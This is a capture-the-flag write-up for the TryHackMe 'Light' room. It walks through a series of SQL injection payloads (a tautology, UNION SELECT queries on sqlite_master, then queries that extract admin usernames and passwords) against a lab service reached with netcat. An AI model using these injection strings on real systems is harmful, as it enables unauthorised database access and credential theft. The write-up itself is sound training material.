---
title: Light
tags:
  - thm
  - easy
---

#### Author: **Xera**

---

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*e2p8-2CzuN54TkUIDLhDMg.png)

This is a writeup for Light room.

My target IP: 10.10.134.21

---

The room provides some hints, so an Nmap scan isn’t necessary.

```bash
nc [target ip] 1337
```

![image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*7WVTpU0HrHCic5FpeaDiLQ.png)

After connecting, you’ll be prompted to enter a username. Use the username “smokey” as hinted at in the room.

Once you provide the username, the system will display the corresponding password for it.

---

Afterward, I attempted an SQL injection.

```bash
smokey' OR '1'='1
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*iFTZJ8FFSPTUFKrqxy75-Q.png)

The system provides a different password.

---

```bash
' Union Select name FROM sqlite_master WHERE type='table
```

Then, we discovered the name of the admin’s table.

---

```bash
' Union Select username FROM [admins_table] WHERE username LIKE '%
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*450AFLMrPYuEU4x-5ZdEmg.png)

I obtained the admin’s username by using ‘%’, which matches all records in the table.

---

```bash
' Union Select password FROM [admins table] WHERE username = '[username]
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*WZrgdgxJguDEZuVDJwDXhA.png)

To query the admin’s password, use the username from the previous output.

---

```bash
' Union Select COUNT(username) FROM [admins_table] WHERE '1
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*yKDkWdDO_eaPvCrd3Yscuw.png)

To find the flag, observe that there are two entries in the admins table.

---

```bash
' Union Select username FROM [admins table] WHERE username != '[username]
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*utHEc5Sx_VFEOooaaEYRrA.png)

Query the admins table and filter by the admin’s username to reveal the “flag” username.

---

```bash
' Union Select password FROM [admins table] WHERE username = 'flag
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*1-fFcScbuY1PGu06scdzxg.png)

Query the password for the username “flag,” and this will give you the answer.
